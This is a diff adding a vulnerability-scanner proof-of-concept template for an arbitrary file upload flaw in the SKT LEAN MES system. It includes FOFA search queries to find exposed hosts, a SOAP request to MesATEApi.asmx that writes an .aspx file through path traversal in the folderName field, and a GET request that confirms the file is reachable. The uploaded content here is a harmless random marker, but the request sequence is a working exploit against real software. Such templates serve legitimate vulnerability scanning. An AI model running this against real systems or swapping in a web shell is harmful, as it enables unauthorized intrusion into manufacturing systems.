@@ -1,0 +1,31 @@
+id: poc-yaml-skt-lean-mes-mesateapi-asmx-anyfile-upload
+info:
+  name: 深科特 LEAN MES系统 MesATEApi.asmx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: lean-mes
+  fofa_1: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js"
+  fofa_2: body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+  t3: base64(t2)
+requests:
+- method: POST
+  path: /WebService/MesATEApi.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://mesateapi.com/UploadFileToMES"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <UploadFileToMES xmlns=\"http://mesateapi.com/\">\n    \
+    \  <empNo>string</empNo>\n      <sn>string</sn>\n      <resource>string</resource>\n\
+    \      <station>string</station>\n      <fileBytes>{{.t3}}</fileBytes>\n     \
+    \ <folderName>/../ertyui</folderName>\n      <fileName>{{.t1}}.aspx</fileName>\n\
+    \    </UploadFileToMES>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"文件上传成功") && contains(body,"<UploadFileToMESResult>")
+- method: GET
+  path: /ertyui/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
